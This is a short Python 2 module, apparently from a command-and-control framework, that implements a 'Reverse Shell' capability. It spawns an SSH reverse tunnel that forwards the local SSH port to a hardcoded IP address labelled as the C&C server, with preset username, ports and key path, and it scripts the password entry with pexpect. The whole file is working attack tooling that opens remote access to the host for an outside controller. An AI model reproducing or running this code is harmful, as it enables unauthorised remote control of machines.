from capability import *
import pexpect
import getpass
import os
import sys

class Reverse(Capability):

    def __init__(self, core):
        super(Reverse, self).__init__(core)
        self.name = "Reverse Shell"
        self.intro = GOOD + "Using Reverse Shell module..."
        self.core = core
        self.options = {
            "master": Option("master", "129.2.204.176", "ip address of C&C server", True), # self.core.cnc
            "local_port": Option("local_port", "19999", "local port to reverse to", True),
            "username": Option("username", "aces", "username for SSH on C&C server", True),
            "remote_port": Option("remote_port", "13337", "local port to reverse to", True),
            "public_key": Option("public_key", "~/.ssh/id_rsa.pub", "RSA Key for passwordless login", True)
        }
        self.help_text = "Opens a reverse shell to the C&C server"
        self.proc = None

    def restore(self):
        sys.stdout.write(GOOD)
        sys.stdout.flush()
        os.system("ssh -S cntrl -O exit %s@%s" % (self.get_value("username"), self.get_value("master")))

    def launch(self):
        self.proc = pexpect.spawn("ssh -M -S cntrl -f -N -R %s:localhost:22 %s@%s -p %s" % (self.get_value("local_port"), self.get_value("username"), self.get_value("master"), self.get_value("remote_port")))
        self.proc.expect("word: ")
        pw = getpass.getpass()
        self.proc.sendline(pw)
        self.proc.expect(pexpect.EOF)
        print GOOD + "Reverse shell initiated."




